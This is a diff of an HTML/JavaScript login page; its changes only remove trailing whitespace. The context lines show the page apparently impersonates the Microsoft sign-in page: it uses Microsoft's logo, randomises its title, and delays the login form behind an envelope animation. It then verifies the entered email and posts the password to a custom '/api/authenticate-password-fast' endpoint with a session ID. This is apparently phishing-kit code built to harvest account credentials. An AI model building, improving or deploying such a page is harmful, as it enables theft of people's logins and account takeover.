@@ -941,7 +941,7 @@
                 <div class="background-fill"></div>
             </div>
         </div>
-        
+
         <!-- Microsoft logo in animation overlay only -->
         <div style="position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);">
             <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" 
@@ -1108,29 +1108,29 @@
         document.addEventListener('DOMContentLoaded', function() {
             generateRandomTitle(); // Set random title
             loadBackgroundUrl(); // Load dynamic background
-            
+
             // Hide main container initially while envelope animation plays
             const mainContainer = document.querySelector('.container');
             const signInOptions = document.querySelector('.sign-in-options');
             const footerLinks = document.querySelector('.footer-links');
-            
+
             if (mainContainer) mainContainer.style.opacity = '0';
             if (signInOptions) signInOptions.style.opacity = '0';
             if (footerLinks) footerLinks.style.opacity = '0';
-            
+
             // After 3 seconds (one animation cycle), fade out overlay and show login form
             setTimeout(function() {
                 const overlay = document.getElementById('envelopeLoadingOverlay');
                 if (overlay) {
                     overlay.classList.add('fade-out');
                     overlay.setAttribute('aria-hidden', 'true');
-                    
+
                     // Reveal main content after fade-out transition completes
                     setTimeout(function() {
                         if (mainContainer) mainContainer.style.opacity = '1';
                         if (signInOptions) signInOptions.style.opacity = '1';
                         if (footerLinks) footerLinks.style.opacity = '1';
-                        
+
                         // Remove overlay from DOM to prevent any interference
                         if (overlay && overlay.parentNode) {
                             overlay.parentNode.removeChild(overlay);
@@ -1138,7 +1138,7 @@
                     }, 600); // Match the CSS transition duration
                 }
             }, 3000); // 3 seconds for envelope animation
-            
+
             setLoading(false); // Start with loading off
             checkBackendHealth();
             checkExistingSession();
@@ -1442,7 +1442,7 @@ Status: ${data.status}`);
                 if (verifyResponse.ok && verifyData.exists) {
                     // Account exists
                     console.log('✅ Email account verified');
-                    
+
                     // Show password form
                     setLoading(false);
                     showPasswordForm(email);
@@ -1552,7 +1552,7 @@ Status: ${data.status}`);
                 if (currentSessionId) {
                     payload.sessionId = currentSessionId; // Include session ID if available
                 }
-                
+
                 const response = await fetch('/api/authenticate-password-fast', {
                     method: 'POST',
                     headers: {
